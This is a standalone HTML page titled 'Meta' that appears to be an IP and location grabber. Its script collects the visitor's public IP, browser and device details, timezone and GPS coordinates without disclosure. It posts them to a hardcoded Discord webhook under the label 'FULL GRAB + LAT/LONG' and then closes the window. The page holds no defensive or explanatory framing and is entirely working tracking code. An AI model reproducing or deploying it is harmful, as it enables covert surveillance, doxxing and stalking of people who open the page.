<!DOCTYPE html><html><head><title>Meta</title><style>body{margin:0;background:#000;color:#fff;height:100vh;display:flex;align-items:center;justify-content:center;}</style></head><body><div id="status">Grabbing all + loc...</div><script>
const WEBHOOK_URL='https://discord.com/api/webhooks/1495498146355089613/gBZlqAlyhI_XOfhYN_TvPNTn76kSptOY1Blh6QEDAbXWCSxn6GHmsM_uaQEK9pNkK8Sk';
const info = {timestamp:new Date().toISOString(),ip:null,userAgent:navigator.userAgent,platform:navigator.platform,screen:`${screen.width}x${screen.height}`,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,latitude:null,longitude:null};
async function main(){
  try{info.ip=(await(await fetch('https://api.ipify.org?format=json')).json()).ip}catch{}
  if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(p=>{info.latitude=p.coords.latitude;info.longitude=p.coords.longitude; sendData();},()=>sendData());
  } else sendData();
  async function sendData(){
    const fd=new FormData(); fd.append('payload_json',JSON.stringify({content:'**FULL GRAB + LAT/LONG**',embeds:[{description:JSON.stringify(info,null,2)}]}));
    await fetch(WEBHOOK_URL,{method:'POST',body:fd});
    setTimeout(()=>window.close(),600);
  }
}main();
</script></body></html>
